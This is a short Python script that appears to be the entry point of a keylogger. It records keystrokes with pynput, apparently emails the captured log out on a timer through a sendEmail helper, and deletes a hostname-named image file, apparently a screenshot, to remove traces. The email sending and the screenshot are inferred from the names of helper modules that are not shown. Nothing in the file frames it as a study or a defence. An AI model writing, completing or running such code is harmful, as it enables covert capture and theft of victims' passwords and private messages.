import os, socket

from sendEmail import sndEmail
from pynput.keyboard import Listener

from functions import keyloggerFn
fnKeyLogger = keyloggerFn.keylogger()


with Listener(on_press=fnKeyLogger.writeLog, on_release=fnKeyLogger.stopKeyLogger) as listener:
    email = sndEmail() 
    email.timeToSend()
    
    os.remove(f'{socket.gethostname()}.png')
    listener.join()